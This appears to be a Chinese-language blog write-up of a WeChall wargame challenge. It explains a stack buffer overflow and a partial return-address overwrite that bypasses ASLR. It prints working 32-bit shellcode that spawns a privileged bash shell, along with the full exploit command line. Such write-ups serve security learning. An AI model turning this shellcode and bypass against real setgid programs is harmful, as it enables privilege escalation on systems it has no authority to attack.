---
title: Tropical Fruits
author: rk700
layout: post
redirect_from: 
  - /writeup/2014/06/19/tropical-fruits
  - /writeup/2014/06/19/tropical-fruits/
tags:
  - wechall
  - exploit
---
<http://www.wechall.net/challenge/warchall/tropical/7/index.php>  
这道题overflow很明显，关键是怎样绕过ASLR。

到现在做了这些题目，总结下来要找漏洞的话，最好是能找到不自然的地方。这道题的不自然之处在具体溢出那里，用的是`memcpy`加`strlen`，而一般来说复制字符串直接`strcpy`就够了。所以这里是关键，两种方法相比，`memcpy`不会在最后添null字符，这给了我们提示。另一方面，由于各个库的的地址都随机化了，所以我们用partial EIP overwrite，也就是只修改返回地址的低位。而正是由于`memcpy`我们才不用担心多余的null字符

具体的，随机化只是随机page, 在page内的offset还是不变的。page的大小是4k，也就是说地址的后三位不会被随机化。调用`vulnfunc`后的返回地址是`0x08048540`，我们修改最低位的那个byte，让返回到其他地方。这里我选择返回到`0x08040563`，其内容是`ret`

这样一来，从`vulnfunc`返回后，又调用一次`ret`，其效果是跳转到`vulnfunc`的`argv[1]`那里。幸运的是`argv[1]`的内容正是我们提供的，这样就实现了exploit

下面是shellcode的汇编代码，由于`/bin/sh`被链接到`/bin/bash`了，所以我们需要`-p`选项来保持setgid

{% highlight nasm %}
BITS 32
xor eax, eax

push eax
mov edx, esp ;env
push word 0x702d 
mov ecx, esp ;-p

push eax
push byte 0x68
push 0x7361622f
push 0x6e69622f
mov ebx, esp ;/bin/bash

push eax
push ecx
push ebx
mov ecx, esp ;argv
mov al, 11 ;execve("/bin/bash", ["/bin/bash", "-p", NULL], [NULL])
int 0x80
{% endhighlight %}

编译得到二进制文件，大小是35byte

buffer到返回地址的距离很容易得到，用a填充完后，最后一个byte是0x63，将返回地址的最低位改写：  
{% highlight bash %}
$ ./level7 `perl -e 'print "\x31\xc0\x50\x89\xe2\x66\x68\x2d\x70\x89\xe1\x50\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80" . "a"x277 . "\x63"'`
{% endhighlight %}
